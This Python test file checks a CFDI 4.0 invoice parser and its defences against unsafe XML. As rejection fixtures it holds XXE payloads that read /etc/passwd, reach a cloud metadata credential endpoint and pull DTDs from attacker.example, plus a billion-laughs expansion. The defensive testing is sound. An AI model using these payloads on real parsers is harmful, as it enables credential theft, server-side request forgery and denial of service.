"""CFDI 4.0 parsing and XXE / entity-expansion defences."""

from __future__ import annotations

from decimal import Decimal

import pytest

from triage_engine.security.xml_safe import UnsafeXMLError, parse_untrusted_xml
from triage_engine.services.cfdi import CFDIParseError, parse_cfdi


def test_parses_cfdi_with_carta_porte_and_comercio_exterior(cfdi_xml: bytes) -> None:
    factura = parse_cfdi(cfdi_xml)
    assert factura.cfdi_version == "4.0"
    assert factura.fiscal_uuid == "6F1C2A3B-4D5E-4F60-8172-93A4B5C6D7E8"
    assert (factura.series, factura.folio) == ("A", "1001")
    assert factura.issuer_rfc == "EXP010101AB1"
    assert factura.subtotal == Decimal("30000.00")
    assert factura.package_count == 1200
    assert factura.net_weight is not None and factura.net_weight.pounds == Decimal("25551.58")
    assert [line.tariff_fraction for line in factura.line_items] == ["0804400100", "0805500200"]
    assert "A-1001" in factura.references


def test_driver_data_in_carta_porte_is_not_extracted(cfdi_xml: bytes) -> None:
    dumped = parse_cfdi(cfdi_xml).model_dump_json()
    assert "GOMJ800101AB1" not in dumped
    assert "BCN0012345" not in dumped


def test_rejects_tampered_subtotal(cfdi_xml: bytes) -> None:
    tampered = cfdi_xml.replace(b'SubTotal="30000.00"', b'SubTotal="29000.00"')
    with pytest.raises(CFDIParseError, match="failed validation"):
        parse_cfdi(tampered)


def test_rejects_wrong_namespace(cfdi_xml: bytes) -> None:
    v33 = cfdi_xml.replace(b"http://www.sat.gob.mx/cfd/4", b"http://www.sat.gob.mx/cfd/3")
    with pytest.raises(CFDIParseError, match=r"CFDI 4\.0"):
        parse_cfdi(v33)


XXE_FILE = b"""<?xml version="1.0"?>
<!DOCTYPE c [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" Version="4.0">&xxe;</cfdi:Comprobante>
"""

XXE_SSRF = b"""<?xml version="1.0"?>
<!DOCTYPE c [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">]>
<c>&xxe;</c>
"""

XXE_PARAMETER = b"""<?xml version="1.0"?>
<!DOCTYPE c [<!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd"> %ext;]>
<c/>
"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
"""

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE c SYSTEM "http://attacker.example/x.dtd">
<c/>
"""


@pytest.mark.parametrize(
    "payload", [XXE_FILE, XXE_SSRF, XXE_PARAMETER, BILLION_LAUGHS, EXTERNAL_DTD]
)
def test_dangerous_xml_is_rejected(payload: bytes) -> None:
    with pytest.raises(UnsafeXMLError, match="forbidden XML construct"):
        parse_untrusted_xml(payload)
    with pytest.raises(UnsafeXMLError):
        parse_cfdi(payload)


def test_malformed_and_oversized_xml() -> None:
    with pytest.raises(UnsafeXMLError, match="malformed"):
        parse_untrusted_xml(b"<a><b></a>")
    with pytest.raises(UnsafeXMLError, match="exceeds"):
        parse_untrusted_xml(b"<a/>" + b" " * 64, max_bytes=16)
    with pytest.raises(UnsafeXMLError, match="empty"):
        parse_untrusted_xml(b"   ")
